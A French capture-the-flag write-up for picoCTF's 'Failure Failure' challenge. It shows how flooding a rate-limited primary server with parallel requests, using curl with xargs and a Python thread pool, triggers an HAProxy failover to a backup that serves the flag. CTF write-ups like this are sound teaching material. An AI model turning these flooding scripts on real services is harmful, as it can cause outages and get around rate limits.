# 756 — Failure Failure

**Événement** : picoCTF 2026 · **Catégorie** : General Skills

## Énoncé

> Welcome to Failure Failure - a high-availability system challenge. It simulates a real-world
> failover scenario where one server is prioritized over the other. A load balancer stands between
> you and the flag - it won't hand over the flag until you force its hand.

La configuration HAProxy et le code applicatif sont fournis.

## Analyse

### Le comportement nominal

En visitant l'URL, le serveur primaire répond « No flag in this service ». Le flag n'est donc pas
caché dans une route oubliée : c'est le second serveur, en secours, qui le détient.

### Le mécanisme lu dans les fichiers

La lecture de `haproxy.cfg` et du code applicatif donne deux constantes qui suffisent à comprendre le
montage :

1. le primaire applique une limite de **300 requêtes par minute** et renvoie un `503` au-delà ;
2. HAProxy bascule vers le serveur de secours dès qu'il voit une réponse non-200.

La sécurité du dispositif repose donc sur la santé du primaire. Il suffit de saturer volontairement
son quota pour le faire paraître en échec, et le load balancer sert alors le backup — celui qui rend le
flag.

### Ce qu'on cherche à provoquer

On ne casse rien : on provoque un comportement prévu, le basculement. Le `503` est la condition
déclenchante, pas la panne. Toute la manipulation tient dans une fenêtre de soixante secondes, le
temps que le compteur du primaire se réinitialise.

## Solution

### 1. Confirmer le seuil

```bash
grep -nE 'rate|limit|300|503|flag' haproxy.cfg app.py   # adapter aux noms fournis
curl -s -o /dev/null -w '%{http_code}\n' http://<HOST>:<PORT>/   # 200 sur le primaire
```

Le premier `curl` donne `200` et la réponse « No flag in this service » : on est bien sur le primaire.

### 2. Inonder le primaire

```bash
seq 1 500 | xargs -P50 -I {} curl -s http://<HOST>:<PORT>/ -o /dev/null
sleep 2          # laisser HAProxy détecter l'échec
curl -s http://<HOST>:<PORT>/     # sert désormais le backup
```

Cinquante requêtes parallèles consomment le quota de 300 en quelques secondes. Le `sleep 2` couvre la
latence de détection du load balancer.

### 3. Variante parallèle explicite

Si le `xargs` ne sature pas assez vite, une version Python rend le débit et le compte mesurables :

```python
import concurrent.futures as cf, collections, requests

URL = "http://<HOST>:<PORT>/"

def hit(_):
    try:
        return requests.get(URL, timeout=5).status_code
    except Exception as e:
        return type(e).__name__

codes = collections.Counter()
with cf.ThreadPoolExecutor(max_workers=60) as ex:
    codes.update(ex.map(hit, range(500)))
print(codes)                       # doit contenir des 503
print(requests.get(URL, timeout=5).text)
```

Le `Counter` sert de preuve : tant qu'aucun `503` n'apparaît, le quota n'est pas atteint et il est
inutile d'espérer le basculement.

### 4. Récupérer le flag

Dès que le backup répond, la dernière requête contient le flag dans le corps de la page. On le relève
immédiatement, avant que le compteur ne se réinitialise et que HAProxy ne renvoie le trafic vers le
primaire.

### Pourquoi ça marche

Le load balancer ne juge la santé du primaire qu'à travers ses réponses HTTP. Le mécanisme
anti-abus du primaire — une limite de débit — devient donc un signal de panne pour l'infrastructure :
en le déclenchant volontairement, on force l'arbitrage vers une instance qui n'a pas cette limite et
qui, elle, détient le flag. La faille n'est pas dans le code mais dans le couplage entre les deux
composants.

## Pièges

- **Ne pas paralléliser.** 300 requêtes séquentielles dépassent souvent la minute et le compteur se
  réinitialise avant la bascule : le quota n'est jamais franchi.
- **Croire que le `503` est une erreur bloquante.** C'est exactement ce qu'on veut provoquer.
- **Attendre trop longtemps après l'inondation.** Une fois la fenêtre retombée, HAProxy revient sur
  le primaire et la requête finale rend à nouveau « No flag in this service ».
- **Regarder le code de statut au lieu du corps.** Le flag arrive dans le HTML du backup : `-o
  /dev/null` sur la dernière requête ferait perdre le résultat.
- **Négliger la persistance de connexion.** Un client en keep-alive peut rester collé au même
  backend ; le `curl` final doit être une requête indépendante.

## Flag

Flag validé sur la plateforme (valeur non conservée).
